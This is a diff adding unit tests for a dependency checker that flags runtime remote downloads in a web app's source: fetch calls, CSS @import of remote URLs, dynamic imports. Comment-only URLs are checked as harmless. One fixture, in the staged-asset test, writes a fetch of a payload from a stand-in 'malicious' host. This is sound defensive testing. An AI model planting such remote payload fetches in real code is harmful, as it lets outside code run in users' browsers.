@@ -214,6 +214,89 @@ class NoCdnTests(unittest.TestCase):
                 run_quiet(check_dependencies.check_no_runtime_download)
         self.assertTrue(any("no-cdn" in f for f in check_dependencies.FAILURES))
 
+    def test_regex_quote_with_fetch_fails(self):
+        """Regex literal containing quotes must not mask subsequent executable fetch."""
+        reset_state()
+        with tempfile.TemporaryDirectory() as tmp_name:
+            tmp = Path(tmp_name)
+            (tmp / "apps/web/src").mkdir(parents=True)
+            (tmp / "apps/web/src/loader.ts").write_text(
+                'const quote = /"/; fetch("https://example.com/model.bin");\n')
+            with mock.patch.object(check_dependencies, "ROOT", tmp):
+                run_quiet(check_dependencies.check_no_runtime_download)
+        self.assertTrue(any("no-cdn.sources" in f for f in check_dependencies.FAILURES))
+
+    def test_css_import_remote_fails(self):
+        """CSS @import referencing remote CDN or URL must be detected."""
+        reset_state()
+        with tempfile.TemporaryDirectory() as tmp_name:
+            tmp = Path(tmp_name)
+            (tmp / "apps/web/src").mkdir(parents=True)
+            (tmp / "apps/web/src/style.css").write_text(
+                '@import url(https://cdn.jsdelivr.net/npm/example/style.css);\n')
+            with mock.patch.object(check_dependencies, "ROOT", tmp):
+                run_quiet(check_dependencies.check_no_runtime_download)
+        self.assertTrue(any("no-cdn.sources" in f for f in check_dependencies.FAILURES))
+
+    def test_css_import_without_cdn_fails(self):
+        """CSS @import referencing non-CDN remote URL must also be detected as executable loader."""
+        reset_state()
+        with tempfile.TemporaryDirectory() as tmp_name:
+            tmp = Path(tmp_name)
+            (tmp / "apps/web/src").mkdir(parents=True)
+            (tmp / "apps/web/src/style.css").write_text(
+                '@import url("https://example.com/theme.css");\n')
+            with mock.patch.object(check_dependencies, "ROOT", tmp):
+                run_quiet(check_dependencies.check_no_runtime_download)
+        self.assertTrue(any("no-cdn.sources" in f for f in check_dependencies.FAILURES))
+
+    def test_dynamic_import_fails(self):
+        """Dynamic import('https://...') must be detected as an executable loader."""
+        reset_state()
+        with tempfile.TemporaryDirectory() as tmp_name:
+            tmp = Path(tmp_name)
+            (tmp / "apps/web/src").mkdir(parents=True)
+            (tmp / "apps/web/src/dynamic.ts").write_text(
+                'const m = await import("https://example.com/mod.js");\n')
+            with mock.patch.object(check_dependencies, "ROOT", tmp):
+                run_quiet(check_dependencies.check_no_runtime_download)
+        self.assertTrue(any("no-cdn.sources" in f for f in check_dependencies.FAILURES))
+
+    def test_harmless_notices_and_comments_pass(self):
+        """Harmless copyright and licensing notices in comments must not trigger failures."""
+        reset_state()
+        with tempfile.TemporaryDirectory() as tmp_name:
+            tmp = Path(tmp_name)
+            (tmp / "apps/web/src").mkdir(parents=True)
+            (tmp / "apps/web/src/code.ts").write_text(
+                '// Licensed under MIT: https://cdn.jsdelivr.net/example\n'
+                '/* See https://unpkg.com/foo for upstream license */\n'
+                'const x = 1;\n'
+            )
+            (tmp / "apps/web/src/styles.css").write_text(
+                '/* Style license: https://cdn.jsdelivr.net/license */\n'
+                'body { margin: 0; }\n'
+            )
+            (tmp / "apps/web/src/page.html").write_text(
+                '<!-- Documentation at https://cdn.jsdelivr.net/doc -->\n'
+                '<div>Clean</div>\n'
+            )
+            with mock.patch.object(check_dependencies, "ROOT", tmp):
+                run_quiet(check_dependencies.check_no_runtime_download)
+        self.assertFalse(check_dependencies.FAILURES)
+
+    def test_staged_asset_executable_loader_fails(self):
+        """Executable remote loader in staged text asset under apps/web/public must fail."""
+        reset_state()
+        with tempfile.TemporaryDirectory() as tmp_name:
+            tmp = Path(tmp_name)
+            (tmp / "apps/web/public").mkdir(parents=True)
+            (tmp / "apps/web/public/asset.js").write_text(
+                'fetch("https://malicious.example.com/payload.bin");\n')
+            with mock.patch.object(check_dependencies, "ROOT", tmp):
+                run_quiet(check_dependencies.check_no_runtime_download)
+        self.assertTrue(any("no-cdn.sources" in f for f in check_dependencies.FAILURES))
+
 
 class LiveCheckoutTests(unittest.TestCase):
     def test_frozen_acceptance_passes_on_this_checkout(self):
